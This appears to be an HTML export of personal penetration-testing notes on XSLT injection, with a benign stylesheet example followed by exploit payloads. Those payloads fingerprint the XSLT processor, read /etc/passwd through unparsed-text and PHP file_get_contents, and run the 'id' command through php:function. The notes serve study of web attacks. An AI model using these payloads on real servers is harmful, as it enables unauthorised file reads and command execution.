<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>31-XSLT injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>31-XSLT injection</h1><br/><p><h2>Intro</h2><ul><li>XSLT is similar to XML = extensible stylesheet template <ul><li></li></ul></li></ul><div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span>?&gt;<br />&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;<br />	&lt;xsl:template match=&quot;/fruits&quot;&gt;<br />		Here are all the fruits:<br />		&lt;xsl:for-each select=&quot;fruit&quot;&gt;<br />			&lt;xsl:value-of select=&quot;name&quot;/&gt; (&lt;xsl:value-of select=&quot;color&quot;/&gt;)<br />		&lt;/xsl:for-each&gt;<br />	&lt;/xsl:template&gt;<br />&lt;/xsl:stylesheet&gt;</pre></div><ul><li>XSL:template applied to fruits node </li></ul></p><p></p><p></p><p><h2>Idetification</h2><ul><li>context to look for : app incorporate user data intio xml and store it via xslt processing<ul><li></li></ul></li></ul><img src="images/503-1.png" alt="images/503-1.png" /></p><p></p><p></p><p><h2>Exploit</h2><ul><li>info disclosure <ul><li></li></ul></li></ul><div class="codebox"><pre>Version: &lt;xsl: value-of select=&quot;system-property(&#39;xsl:version&#39;)&quot; /&gt;<br />&lt;br/&gt;<br />Vendor: &lt;xsl: value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot; /&gt;<br />&lt;br/&gt;<br />Vendor URL: &lt;xsl: value-of select=&quot;system-property(&#39;xsl:vendor-url&#39;)&quot; /&gt;<br />&lt;br/&gt;<br />Product Name: &lt;xsl: value-of select=&quot;system-property(&#39;xsl:product-name&#39;)&quot;<br />/&gt;<br />&lt;br/&gt;<br />Product Version: &lt;xsl: value-of select=&quot;system-property(&#39;xsl:productversion&#39;)&quot;<br />/&gt;<br /></pre></div></p><p></p><p><ul><li>LFI<ul><li>&lt;xsl:value-of select=&quot;unparsed-text(&#39;/etc/passwd&#39;, &#39;utf-8&#39;)&quot; /&gt;</li><li>&lt;xsl:value-of select=&quot;php:function(&#39;file_get_contents&#39;,&#39;/etc/passwd&#39;)&quot; /&gt;</li></ul></li><li>PHP RCE (if xslt processir support php functions)<ul><li>&lt;xsl:value-of select=&quot;php:function(&#39;system&#39;,&#39;id&#39;)&quot; /&gt;</li></ul></li></ul></p></div>
</body>
</html>
